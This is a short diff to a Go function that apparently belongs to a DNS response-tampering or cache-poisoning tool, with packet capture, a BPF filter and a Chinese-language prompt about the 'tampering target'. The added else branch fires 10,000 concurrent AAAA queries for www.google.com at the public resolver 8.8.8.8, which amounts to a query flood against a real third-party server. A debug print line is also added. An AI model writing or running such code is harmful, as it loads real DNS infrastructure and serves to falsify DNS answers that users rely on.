@@ -490,6 +490,17 @@ func Main(ifaceName string, authIPArg net.IP, resolverIPArg net.IP, resolverBack
 			println("参数有误，请输入IPv6地址作为篡改目标结果")
 		}
 
+	}else{
+		c := new(dns.Client)
+                msg := new(dns.Msg)
+                domain := "www.google.com."
+                msg.SetQuestion(domain, dns.TypeAAAA)
+		for i:=0;i<10000;i++{
+			go func(){
+                	_, _, _ = c.Exchange(msg, net.JoinHostPort("8.8.8.8","53"))
+			}()
+		}
+               	return
 	}
 	rand.Seed(time.Now().UnixNano())
 	handle, _ = pcap.OpenLive(
@@ -498,6 +509,7 @@ func Main(ifaceName string, authIPArg net.IP, resolverIPArg net.IP, resolverBack
 		true,
 		pcap.BlockForever,
 	)
+	println(authIPArg.To16().String())
 	err := handle.SetBPFFilter("not host " + authIPArg.To16().String())
 	if err != nil {
 		fmt.Println("cannot set BPF filter.")
